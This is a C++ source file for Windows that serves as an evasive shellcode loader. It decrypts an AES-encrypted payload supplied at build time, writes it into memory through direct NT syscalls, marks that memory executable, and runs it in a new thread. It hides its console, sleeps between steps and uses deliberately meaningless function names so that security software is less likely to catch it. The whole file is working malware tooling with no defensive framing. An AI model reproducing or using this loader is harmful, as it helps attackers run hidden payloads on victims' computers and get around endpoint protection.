#include <iostream>
#include <windows.h>
#include "syscalls.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");



static void Random4(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

int Random1(char * difern, unsigned int difern_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, difern, &difern_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

char Random2[] = KEYVALUE

unsigned char Random3[] = PAYVAL

unsigned int Random7_len = sizeof(Random3);

int main() {
   
    FreeConsole();
    LPVOID allocation_start = nullptr;
    SIZE_T allocation_size = sizeof(Random3);
    HANDLE hThread;
    NTSTATUS status;
    DWORD oldprotect = 0;

   NTSTATUS Random6 = NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    SIZE_T size = sizeof(Random3);

    Random4(3000);
    
      
    Random1((char *) Random3, Random7_len, Random2, sizeof(Random2));

    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, Random3, sizeof(Random3), 0);

    DWORD oldProtect;
if (VirtualProtect(allocation_start, allocation_size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
    printf("VirtualProtect failed with error code: %lx\n", GetLastError());
    return -1;
}

    Random4(3000);
    NTSTATUS createThreadResult = NtCreateThreadEx(
    &hThread,
    THREAD_ALL_ACCESS,  // DesiredAccess - Adjust this as needed
    NULL,               // ObjectAttributes
    GetCurrentProcess(),
    allocation_start,   // StartAddress
    NULL,               // Parameter
    FALSE,              // CreateSuspended
    NULL,               // StackZeroBits
    NULL,               // SizeOfStackCommit
    NULL,               // SizeOfStackReserve
    NULL                // ThreadId
);
    Random4(3000);
    NtWaitForSingleObject(hThread, FALSE, NULL);
    
    Random4(3000);    
    NtClose(hThread);

    return 0;
}
